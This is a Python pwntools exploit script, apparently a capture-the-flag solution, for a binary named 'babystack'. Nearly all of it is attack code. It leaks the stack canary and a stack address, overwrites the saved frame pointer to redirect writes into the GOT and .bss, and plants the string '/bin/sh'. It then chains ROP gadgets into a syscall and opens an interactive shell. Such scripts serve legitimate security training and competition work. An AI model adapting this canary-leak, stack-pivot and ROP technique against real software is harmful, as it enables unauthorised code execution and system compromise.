#!/usr/bin/python3

from pwn import *
import sys

HOST = ''
PORT = 0
BIN = './babystack'
e = ELF(BIN)

if len(sys.argv) > 1:
    r = remote(HOST, PORT)
else:
    r = process(BIN)

main_addr = 0x401379
first_read = 0x40134C
leave_ret = 0x401235
##### round 1
r.sendafter('Name: ', 'A')
r.sendafter(' your token: ', 'deadbeef')
r.sendafter('str1: ', b'\x00' + b'A'*0x7)
r.sendafter('str2: ', b'A')

r.recvuntil('A'*1)
canary = u64(b'\x00' + r.recv(7))
log.info(f"canary: {hex(canary)}")

stack = u64(r.recv(6) + b'\x00'*2)
log.info(f"stack: {hex(stack)}")

r.sendafter('str1: ', b'\x00' + b'A'*0xf)
r.sendafter('str2: ', b'A'*0x28 + p64(canary) + p64(e.got['__stack_chk_fail'] + 0x50))
r.send(p64(main_addr))
binsh = 0x4034f0

syscall = 0x401437
# ROP = p64(0) + p64(0) + p64(syscall) + p64(binsh) + p64(0) + p64(0) + p64(0x401498) 
# ROP = p64(0) + p64(0) + p64(syscall) + p64(binsh) + p64(0) + p64(0) + p64(0x401498) 


##### round 2 => write binsh
# stack - 0x90
sleep(0.1)
r.send('A')
sleep(0.1)
r.send('deadbeef')
sleep(0.1)
r.send('A')
sleep(0.1)
r.send('A')
sleep(0.1)
r.send(b'\x00' + b'A'*0xf)
sleep(0.1)
r.send(b'A'*0x28 + p64(canary) + p64(binsh + 0x50))
sleep(0.1)
r.send(b"/bin/sh\x00")

##### round 3 => ROP
# stack - 0x100
canary_addr = stack - 0x78
bss = 0x403a00

sleep(0.1)
r.send(p64(canary) + p64(leave_ret)) # name
sleep(0.1)
r.send(p64(0x4014B2)*2) # token

## 1
sleep(0.1)
r.send('A')
sleep(0.1)
r.send('A')

## 2
sleep(0.1)
r.send(p64(0)*2)
sleep(0.1)
r.send(p64(syscall) + p64(binsh) + p64(0) + p64(0) + p64(0x401498) + p64(canary) + p64(bss + 0x50))

sleep(0.1)
r.send(p64(canary) + p64(0xAAAAAAAA) + p64(leave_ret))

##### round 4 => ROP again
sleep(0.1)
r.send('A') # name
sleep(0.1)
r.send(p64(0x4014B2)*2) # token

## 1
sleep(0.1)
r.send('A')
sleep(0.1)
r.send('A')

## 2
sleep(0.1)
r.send(p64(0)*2)
sleep(0.1)
r.send(p64(syscall) + p64(binsh) + p64(0) + p64(0) + p64(0x401498) + p64(canary) + p64(bss + 0x8))

sleep(0.1)
input()
r.send('A')

def write_ROP_gadget(ROP, offset):
    sleep(0.1)
    r.send('A') # name
    sleep(0.1)
    r.send('A') # token 

    ## 1
    sleep(0.1)
    r.send('A')
    sleep(0.1)
    r.send('A')

    ## 2
    sleep(0.1)
    r.send(p64(0)*2)
    sleep(0.1)
    r.send(b'b'*0x28 + p64(canary) + p64(bss + offset + 0x50))

    sleep(0.1)
    r.send(ROP)

# from pop rbx
write_ROP_gadget(p64(0x4014B2) + p64(0) + p64(0), 0)
write_ROP_gadget(p64(syscall) + p64(binsh) + p64(0), 0x18)
write_ROP_gadget(p64(0) + p64(0x401498), 0x30)

r.interactive()
